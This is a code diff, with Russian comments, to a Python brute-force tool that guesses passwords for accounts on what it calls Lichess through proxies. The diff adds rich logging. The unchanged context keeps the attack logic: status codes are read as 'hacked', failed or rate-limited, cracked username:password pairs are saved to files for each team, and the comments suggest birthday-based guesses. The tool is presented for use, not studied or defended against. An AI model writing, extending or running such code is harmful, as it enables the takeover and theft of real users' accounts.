@@ -5,12 +5,21 @@ import sys
 import ndjson
 import requests
 
+import logging
+from rich.logging import RichHandler
+
 from config import *
 
 
 # По желанию, чтобы можно было взламывать по дате или году рождения, указанном в профиле, можно загрузить у фиша еще одну программу под именем tracker.py
 # Функции в модуле: tracker.get_birthday(username) возвращает дату рождения, если написана в профиле, tracker.get_year(username) - год рождения
 
+FORMAT = "%(message)s"
+logging.basicConfig(
+    level=logging.INFO, format=FORMAT, datefmt="[%X]", handlers=[RichHandler()]
+) # настройки для логгинга
+
+log = logging.getLogger("rich") # инциализация лога
 
 # Заходим через прокси
 def start(passwords):
@@ -71,7 +80,7 @@ def start(passwords):
             #       Выводим статус взлома
             #       200 означает что аккаунт взломан, 401 что взломать не получилось, 429 что личесс блокирует ваши запросы
             if str(r) == f"<Response [{str(OK_RESPONSE)}]>":
-                print(green + f"{get_ts()} {r}, {username}: {password}")
+                log.info(f"Пароль получен! ({r}) {username}: {password}")
                 with open(f"{HACKEDREAL_PATH}/{team}.txt", "a", encoding="utf-8") as h_list: # сохраняем акк
                     h_list.write(f"{get_ts()} {r} {username}: {password} \n")
 
@@ -79,14 +88,14 @@ def start(passwords):
                     mb_list.write(f"{password} \n")
 
             elif str(r) == f"<Response [{str(ERROR_RESPONSE)}]>":
-                print(yellow + f"{get_ts()} {r}, {username}: {password}")
+                log.info(f"{r}, {username}: {password}")
 
                 if SAVE_EVERYTHING_MULTIPART:
                     with open(f"{HACKEDREAL_PATH}/{team}.txt", "a", encoding="utf-8") as h_list: # сохраняем акк
                         h_list.write(f"{get_ts()} {r} {username}: {password} \n")
 
             elif str(r) == f"<Response [{str(BLOCKED_RESPONSE)}]>":
-                print(red + f"{get_ts()} {r}, {username}: {password}")
+                log.error(f"{r}, {username}: {password}")
 
                 if SAVE_EVERYTHING_MULTIPART:
                     with open(f"{HACKEDREAL_PATH}/{team}.txt", "a", encoding="utf-8") as h_list: # сохраняем акк
